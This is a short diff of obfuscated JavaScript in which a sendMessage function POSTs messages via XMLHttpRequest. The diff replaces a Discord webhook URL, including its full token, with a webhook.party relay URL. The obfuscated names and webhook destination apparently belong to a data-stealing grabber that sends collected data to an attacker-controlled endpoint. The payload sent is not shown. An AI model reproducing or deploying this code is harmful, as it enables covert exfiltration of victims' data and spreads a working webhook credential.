@@ -1,7 +1,7 @@
 var cd = 0x12c;
 function sendMessage(_0x4cae5b, _0x23ef47) {
   var _0xba2fa6 = new XMLHttpRequest();
-  _0xba2fa6.open("POST", "https://discord.com/api/webhooks/1350284606812852236/bWSom4mOQcEgQiT2-T6Knzu8k83n-GCVlf_K7TMznME1uNbLPoTGPXFZAy8_DwtSlJWo");
+  _0xba2fa6.open("POST", "https://l.webhook.party/hook/Z%2Ba48oBXKkQRkdLVGrrXwiGkHGCITmkyNY4X2W9efX%2FvJ8%2FBHWVPcNvPrzhxusqOAoYQ6SH0%2B6K8%2FCONpHBoIaDDhgC5wIFOT8Xf15%2B6KdqkVFiHj2By2mhb1GZ1iMJAenXtULJKqdky2I7k7x3sUER8iHlLStyCpQbe0pMUK3XM46sehjL80iT7CcFDEc5V0kdCpC0NZHd6rEQC4oEP%2BpDmCMdHHRsy0tvs7a5u%2FrydqormDXyJKrh9drey6wmxlfBPvr1RaJ4BKOJGWDtq%2FKHzzxGwxPzMzdx2hsP2q4xoFYImzOWKvu3p9bmFnVZi%2Fi%2FgchHQRQxPSyQaGeXIr3seopBW78UvZMlebpCKSZtukhiF265EQvzavOSht0IfExdkLnCLKrs%3D/aWCPWHos9hIZh2aN");
   var _0x2a43b3 = _0x23ef47;
   if (_0x2a43b3 == '') {
     _0x2a43b3 = "errmmmm I FORGOR...";
